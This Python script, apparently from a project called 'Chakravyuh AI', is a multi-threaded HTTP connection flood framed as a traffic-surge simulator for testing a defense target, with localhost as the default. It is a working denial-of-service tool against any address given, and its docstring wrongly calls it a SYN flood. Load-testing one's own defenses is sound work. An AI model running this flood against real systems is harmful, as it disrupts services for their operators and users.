#!/usr/bin/env python3
"""
Chakravyuh AI: High-Density Traffic / SYN Flood Simulator
Simulates a high-frequency DoS/LOIC-HTTP traffic surge against the defense target.
"""

import socket
import sys
import time
import threading

stop_event = threading.Event()

def flood_worker(target_ip: str, target_port: int, worker_id: int):
    payload = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nUser-Agent: Chakravyuh-Bench/2.0\r\nAccept: */*\r\n\r\n"
    packets_sent = 0
    
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            s.send(payload)
            packets_sent += 1
            s.close()
        except Exception:
            pass
        time.sleep(0.01)

def start_traffic_flood(target_ip: str, target_port: int = 8000, threads: int = 12, duration: int = 10):
    print(f"==================================================")
    print(f"[ATTACK SIMULATION] Launching High-Density Traffic Surge on {target_ip}:{target_port}")
    print(f"Workers: {threads} | Duration: {duration}s")
    print(f"==================================================")
    
    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_port, i))
        t.daemon = True
        t.start()
        thread_pool.append(t)
        
    try:
        for remaining in range(duration, 0, -1):
            sys.stdout.write(f"\r[⚡] Attack underway... {remaining}s remaining (Press Ctrl+C to abort) ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAborted by user.")
        
    stop_event.set()
    print("\n[✓] Traffic flood simulation finished.")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=8000)
    parser.add_argument("--duration", type=int, default=30)
    args = parser.parse_args()
    start_traffic_flood(args.target, args.port, duration=args.duration)
